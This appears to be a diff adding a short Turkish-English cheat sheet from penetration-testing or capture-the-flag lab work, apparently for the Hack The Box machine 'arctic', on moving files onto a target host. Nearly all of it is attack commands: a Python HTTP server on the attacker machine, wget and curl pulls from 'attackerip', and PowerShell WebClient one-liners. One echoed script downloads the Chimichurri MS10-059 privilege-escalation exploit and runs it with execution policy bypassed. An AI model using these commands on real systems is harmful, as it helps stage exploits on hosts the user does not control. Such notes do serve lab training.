@@ -1,0 +1,26 @@
+##Linux
+
+#İlk olarak web sunucu oluşturuyoruz kendi makinemizde;
+python -m SimpleHTTPServer 9090
+
+#Ardından web sunucu üzerinden dosyamızı çekiyoruz;
+wget http://attackerip/file
+curl http://attackerip/file > file
+
+
+##Windows (arctic)
+
+# With Powershell
+
+powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.10.14.17/WindowsEnum/WindowsEnum.ps1','C:\Users\Public\Downloads\WindowsEnum.ps1')
+
+#Target Machine
+
+echo $webclient = New-Object System.Net.WebClient >>wget.ps1
+echo $url = "http://attackerip:port/Chimichurri.exe" >>wget.ps1
+echo $file = "ms10-059-exploit.exe" >>wget.ps1
+echo $webclient.DownloadFile($url,$file) >>wget.ps1
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
+
+
+*** Öncesinde python -m SimpleHTTPServer ile HTTP sunucu oluşturuyoruz.
